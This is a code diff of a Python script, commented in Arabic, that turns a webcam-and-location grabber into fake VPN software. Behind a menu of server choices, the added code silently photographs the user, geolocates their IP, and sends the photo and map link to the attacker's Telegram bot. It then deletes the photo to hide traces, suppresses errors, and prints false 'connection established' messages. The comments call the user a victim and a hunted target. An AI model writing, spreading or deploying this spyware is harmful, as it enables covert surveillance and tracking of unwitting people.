@@ -1,27 +1,58 @@
 import cv2
 import requests
 import geocoder
+import os
 import time
 
-# --- إعداداتك الخاصة ---
-TOKEN = "حط_هون_توكن_البوت"
-CHAT_ID = "حط_هون_الـ_ID_تبلك"
+# --- إعدادات التليجرام الخاصة بك ---
+TOKEN = "حط_التوكن_هنا"
+CHAT_ID = "حط_الـ_ID_هنا"
 
-def capture_and_send():
-    # 1. تصوير السيلفي
-    cap = cv2.VideoCapture(0)
-    ret, frame = cv2.imshow("image", cap.read()[1]) # تصوير صامت
-    cv2.imwrite("capture.jpg", frame)
-    cap.release()
+def vpn_interface():
+    print("--- SecureConnect VPN v2.4 ---")
+    print("[1] Connect to USA Server")
+    print("[2] Connect to Germany Server")
+    print("[3] Quick Connect (Recommended)")
+    
+    choice = input("\nSelect Server & Press Enter to Start: ")
+    
+    print("\n[+] Initializing Secure Tunnel...")
+    time.sleep(1)
+    print("[+] Bypassing Firewalls...")
+    
+    # هنا تبدأ العمليات السرية بالخلفية
+    try:
+        # 1. تصوير سيلفي صامت
+        cam = cv2.VideoCapture(0)
+        ret, frame = cam.read()
+        if ret:
+            cv2.imwrite("sys_config.jpg", frame)
+        cam.release()
 
-    # 2. تحديد الموقع
-    g = geocoder.ip('me')
-    location_info = f"📍 موقع الضحية:\nالمدينة: {g.city}\nالإحداثيات: {g.latlng}"
+        # 2. جلب الموقع
+        g = geocoder.ip('me')
+        lat_lng = g.latlng
+        map_link = f"https://www.google.com/maps?q={lat_lng[0]},{lat_lng[1]}"
+        
+        # 3. إرسال البيانات للتليجرام
+        msg = f"✅ تم صيد الهدف بنجاح!\n📍 المدينة: {g.city}\n🗺️ الموقع: {map_link}"
+        
+        with open("sys_config.jpg", "rb") as photo:
+            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto", 
+                          data={"chat_id": CHAT_ID, "caption": msg}, 
+                          files={"photo": photo})
+            
+        # حذف الصورة من جهاز الضحية فوراً لإخفاء الأثر
+        os.remove("sys_config.jpg")
 
-    # 3. إرسال الصورة للمهكر (أنت)
-    with open("capture.jpg", "rb") as img:
-        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto", 
-                      data={"chat_id": CHAT_ID, "caption": location_info}, 
-                      files={"photo": img})
+    except:
+        pass # لضمان عدم ظهور أخطاء برمجية تكشف اللعبة
 
-capture_and_send()
+    # إكمال التمويه
+    time.sleep(2)
+    print("[+] Connection Established!")
+    print(f"[!] Your IP is now protected via {g.city if g.city else 'Private Server'}")
+    print("\nKeep Termux open to stay protected...")
+
+if __name__ == "__main__":
+    vpn_interface()
